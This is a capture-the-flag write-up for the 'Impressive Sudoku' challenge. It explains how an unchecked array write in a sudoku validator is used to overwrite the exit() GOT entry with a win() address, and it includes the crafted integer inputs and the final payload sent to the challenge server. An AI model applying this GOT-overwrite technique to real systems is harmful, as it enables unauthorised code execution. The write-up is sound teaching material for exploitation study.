# Impressive Sudoku - pwn, math

> First we asked you to solve a sudoku, now we want you to make one.

Service: nc 3.93.128.89 1218

Download: [4964615443db994db372a3d64524510452521f09809fdb50da22e83d15fb48ca.tar.gz](https://advent2019.s3.amazonaws.com/4964615443db994db372a3d64524510452521f09809fdb50da22e83d15fb48ca.tar.gz)

## Initial Analysis

For this pwn, we're given a C source file along with a compiled binary. This certainly makes the disassembly or reversing part of this challenge easier.

The source asks for a solved sudoku and checks that its valid using an arithmetic shortcut - checking the sum and product of each row. If this passes, it writes 8 values to a "scorer" array, multiplies 9 values in the scorer array, and if the result is > a large value prints a flag. Given that only 8 values are written, this score will always be zero (since at least one value will be zero). Furthermore, writing the scores to the "scorer" array doesn't do any bounds checking so we likely can perform an arbitrary write if we can construct a sudoku

The compiled binary is a 32-bit binary. Based on my initial analysis, I was a little confused about the binary's hardening features. In particular, running `hardening-check` (in the `devscripts` package on Ubuntu) and `readelf` (in the `binutils` package on Ubuntu) clearly inidicate that read-only relocations is enabled (RELRO):

```
root@2b94168a6ea8:/day18# hardening-check ./chal
./chal:
 Position Independent Executable: no, normal executable!
 Stack protected: yes
 Fortify Source functions: unknown, no protectable libc functions used
 Read-only relocations: yes
 Immediate binding: no, not found!
root@2b94168a6ea8:/day18# 
root@2b94168a6ea8:/day18# readelf -l ./chal

Elf file type is EXEC (Executable file)
Entry point 0x8048470
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R   0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00c78 0x00c78 R E 0x1000
  LOAD           0x000f0c 0x08049f0c 0x08049f0c 0x00124 0x002dc RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000aa0 0x08048aa0 0x08048aa0 0x0005c 0x0005c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f0c 0x08049f0c 0x08049f0c 0x000f4 0x000f4 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .dynamic .got 
```

However, digging a little further, we can see that the global offset table (GOT) actually starts at address 0x0804a000 - after the `GNU_RELRO` section, and in fact that page is marked read-write when the binary is running:

```
root@2b94168a6ea8:/day18# ./chal
Could you give me a fully solved sudoku?
Enter 9 lines, each containing 9 integers, space separated:
^Z
[1]+  Stopped                 ./chal
root@2b94168a6ea8:/day18# cat /proc/`pidof chal`/maps
08048000-08049000 r-xp 00000000 00:4d 20354301                           /day18/chal
08049000-0804a000 r--p 00000000 00:4d 20354301                           /day18/chal
0804a000-0804b000 rw-p 00001000 00:4d 20354301                           /day18/chal 			<--- the GOT is in this page
f74fb000-f76d0000 r-xp 00000000 08:01 316321                             /lib/i386-linux-gnu/libc-2.27.so
f76d0000-f76d1000 ---p 001d5000 08:01 316321                             /lib/i386-linux-gnu/libc-2.27.so
f76d1000-f76d3000 r--p 001d5000 08:01 316321                             /lib/i386-linux-gnu/libc-2.27.so
f76d3000-f76d4000 rw-p 001d7000 08:01 316321                             /lib/i386-linux-gnu/libc-2.27.so
f76d4000-f76d7000 rw-p 00000000 00:00 0 
f76dc000-f76de000 rw-p 00000000 00:00 0 
f76de000-f76e0000 r--p 00000000 00:00 0                                  [vvar]
f76e0000-f76e1000 r-xp 00000000 00:00 0                                  [vdso]
f76e1000-f7707000 r-xp 00000000 08:01 316317                             /lib/i386-linux-gnu/ld-2.27.so
f7707000-f7708000 r--p 00025000 08:01 316317                             /lib/i386-linux-gnu/ld-2.27.so
f7708000-f7709000 rw-p 00026000 08:01 316317                             /lib/i386-linux-gnu/ld-2.27.so
ffc08000-ffc29000 rw-p 00000000 00:00 0                                  [stack]
```

As you can see above, the binary is also not randomized, so all addresses in `chal` should be fixed. With this in mind, my goal was now to overwrite the `exit()` address in the GOT with the "scorer" writes from a valid sudoku.

Also, if you couldn't tell already, I did most of my testing in an Ubuntu docker container with my working directory mounted at `/day18`. I started this with:

```
$ docker run -it --cap-add=ALL -v `pwd`:/day18 ubuntu:latest
```

## Creating the overwrite

The first step to this was going to be to solve the overwrite part. To check just this alone, I just edited the `chal` binary so that the `check()` funtion always returned 1. This was done by patching the bytes at address 0x000005F0 with `B8 01 00 00 00 C3` which is x86 assembly for "mov eax, 1; ret".

Next, I calculated that if I had a sudoku with "-105" in position (7,7), and 0x08048799 (the address for the `win()` function), then the loop

```c
for (int i = 0; i < 8; i++) {
    scorer[sudoku[i][i]] = sudoku[i + 1][i + 1];
}
```

would correctly set the address of `exit()` in the GOT with the win function. Since the binary is 32-bit and all of the sudoku values are integers, we can adjust these two values mod 2^32 to get the following. Testing this out on our patched binary gives us the flag (locally).

```
root@2b94168a6ea8:/day18# echo winwinwin > flag.txt
root@2b94168a6ea8:/day18# ./chal_nocheck 
Could you give me a fully solved sudoku?
Enter 9 lines, each containing 9 integers, space separated:
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
1 1 1 1 1 1 1 4294967191 134514585
Let me take a look...
That is an unimpressive sudoku.
winwinwin
root@2b94168a6ea8:/day18# 
```

Now, all I needed to do was have those two values in my sudoku, and create the rest of the square to not touch any other sensitive memory addresses (and cause something like a segfault).

## The math

As the category for this sudoku alluded to, there was not some math to dig into. The only check on the sudoku is that the product and sum of each row, column, and 3x3 grid come to 45 and 362880 respectively. To simplify the problem, if we can create one row with our two target values, several low-value integers, and then some other values, then we should be able to pass these two checks and also not attempt to access we shouldn't when computiing the "solver" array.

To simplify the problem, I decided that I would create a row with my two target values, a bunch of "1"s, and then two "bad" values that would fix the math for the check function, but not appear on the diagonal. With one row in hand, I could make sure that the nine values from that row occurred in each row, column, and 3x3 grid while at the same time making sure that values I didn't like wouldn't appear on the diagonal.

I also chose two variable values because the problem boiled down to two equations (multiply & addition), and two unknowns. In retrospect, I probably could have just run an exhaust on all 2^32 possibilities, but I went the difficult route of solving a quadratic equation modulo 2^32. The math is a little lengthy to describe here, but you can read it in my [solver script](./solutions/day19_solver.py).

Running the script in total outputs my sudoku, and then piping the result to the service gives the flag:

```
$ ./day19_solver.py 
1 134514585 1 317322728 1 1 4294967191 3843130128 1
317322728 1 1 4294967191 3843130128 1 1 134514585 1
4294967191 3843130128 1 1 134514585 1 317322728 1 1
134514585 1 317322728 1 1 4294967191 3843130128 1 1
3843130128 1 1 134514585 1 317322728 1 1 4294967191
1 1 4294967191 3843130128 1 1 134514585 1 317322728
1 4294967191 3843130128 1 1 134514585 1 317322728 1
1 1 134514585 1 317322728 1 1 4294967191 3843130128
1 317322728 1 1 4294967191 3843130128 1 1 134514585
$ ./day19_solver.py | nc 3.93.128.89 1218
Could you give me a fully solved sudoku?
Enter 9 lines, each containing 9 integers, space separated:
Let me take a look...
That is an unimpressive sudoku.
AOTW{Th3t_is_such_aN_1mpr3ssive_Sud0ku}$ 
```
